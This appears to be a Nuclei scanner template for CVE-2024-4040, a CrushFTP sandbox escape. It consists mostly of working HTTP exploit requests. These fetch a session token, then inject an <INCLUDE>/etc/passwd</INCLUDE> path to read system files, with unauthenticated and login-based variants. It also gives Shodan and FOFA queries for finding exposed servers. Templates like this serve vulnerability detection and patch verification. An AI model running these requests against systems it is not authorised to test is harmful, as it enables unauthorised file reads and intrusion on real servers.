flow: "if ( !template.hasOwnProperty('username') || !template.hasOwnProperty('password')\
  \ ) {\n  // if username or password is not provided, run unauthenticated exploit\n\
  \  http(\"unauth-exploit\")\n} else {\n  // if username and password is provided,\
  \ run login script and authenticated exploit\n  http(\"login\") && http(\"auth-exploit\"\
  )\n}\n"
http:
- extractors:
  - group: 1
    internal: true
    name: auth
    part: header_1
    regex:
    - currentAuth=([0-9a-zA-Z]+)
    type: regex
  id: unauth-exploit
  matchers:
  - part: body_2
    type: word
    words:
    - 'root:x:'
  - part: header
    type: word
    words:
    - text/xml
  matchers-condition: and
  raw:
  - 'GET /WebInterface/ HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /WebInterface/function/?command=zip&c2f={{auth}}&path=<INCLUDE>/etc/passwd</INCLUDE>&names=/bbb
    HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: auth
    part: header_2
    regex:
    - currentAuth=([0-9a-zA-Z]+)
    type: regex
  id: login
  matchers:
  - internal: true
    part: body_2
    type: word
    words:
    - <response>success</response>
  - internal: true
    part: header_2
    type: word
    words:
    - text/xml
  matchers-condition: and
  raw:
  - 'GET /WebInterface/ HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /WebInterface/function/ HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 111

    Origin: {{RootURL}}

    Referer: http://{{RootURL}}/WebInterface/login.html


    command=login&username={{username}}&password={{password}}&encoded=true&language=en&random=0.34712915617878926

    '
  stop-at-first-match: true
- id: auth-exploit
  matchers:
  - part: body
    type: word
    words:
    - 'root:x:'
  raw:
  - 'POST /WebInterface/function/?command=zip&c2f={{auth}}&path=<INCLUDE>/etc/passwd</INCLUDE>&names=/bbb
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-4040
info:
  author: DhiyaneshDK,pussycat0x
  classification:
    cpe: cpe:2.3:a:crushftp:crushftp:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-4040
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-94,CWE-1336
    epss-percentile: 0.9998
    epss-score: 0.94426
  description: 'VFS Sandbox Escape in CrushFTP in all versions before 10.7.1 and 11.1.0
    on all platforms allows remote attackers with low privileges to read files from
    the filesystem outside of VFS Sandbox.

    '
  impact: 'Successful exploitation could lead to unauthorized access to sensitive
    data.

    '
  metadata:
    fofa-query: body="crushftp"
    max-request: 5
    product: crushftp
    shodan-query:
    - html:"CrushFTP"
    - http.html:"crushftp"
    vendor: crushftp
    verified: true
  name: CrushFTP VFS - Sandbox Escape LFR
  reference:
  - https://www.bleepingcomputer.com/news/security/crushftp-warns-users-to-patch-exploited-zero-day-immediately/
  - https://www.crushftp.com/crush10wiki/Wiki.jsp?page=Update
  - https://www.reddit.com/r/crowdstrike/comments/1c88788/situational_awareness_20240419_crushftp_virtual/
  - https://www.reddit.com/r/cybersecurity/comments/1c850i2/all_versions_of_crush_ftp_are_vulnerable/
  remediation: 'Apply the vendor-supplied patch or upgrade to the latest version to
    mitigate CVE-2024-4040.

    '
  severity: critical
  tags: cve,cve2024,lfr,crushftp,vfs,kev,vkev,vuln
